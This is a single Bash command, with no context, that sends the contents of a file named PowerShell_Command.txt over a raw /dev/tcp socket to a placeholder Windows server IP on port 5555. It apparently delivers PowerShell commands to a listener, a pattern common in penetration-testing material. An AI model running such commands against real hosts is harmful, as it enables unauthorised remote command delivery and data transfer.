```Bash
cat PowerShell_Command.txt > /dev/tcp/Ip_Servidor_Windows/5555
```
